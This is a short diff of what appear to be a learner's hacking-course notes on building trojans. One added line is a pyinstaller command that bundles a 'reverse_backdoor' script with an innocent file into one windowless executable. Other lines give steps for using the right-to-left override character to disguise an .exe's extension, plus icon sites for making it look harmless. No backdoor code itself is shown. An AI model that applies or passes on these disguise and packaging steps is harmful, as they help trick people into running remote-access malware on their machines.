@@ -1,3 +1,6 @@
+To embedd backdoor with a file: 
+#wine /location_of_pyinstaller.exe --add-data "location_of_file;." --onefile --noconsole location_of_reverse_backdoor.py
 Iconfinder.com
 easyicon.net
-kali->character->right to left->copy character->txt file->zaid.exe \n zaid-fdp.exe->Cursor @ fdp.exe->Paste->Copy->Rename->Paste->Compress
+To change .exe to trojan extension:
+kali->character->right_to _left->copy_character->open_txt_file->zaid.exe_\n_zaid-fdp.exe->Cursor@fdp.exe->Paste->Copy->Rename->Paste->Compress
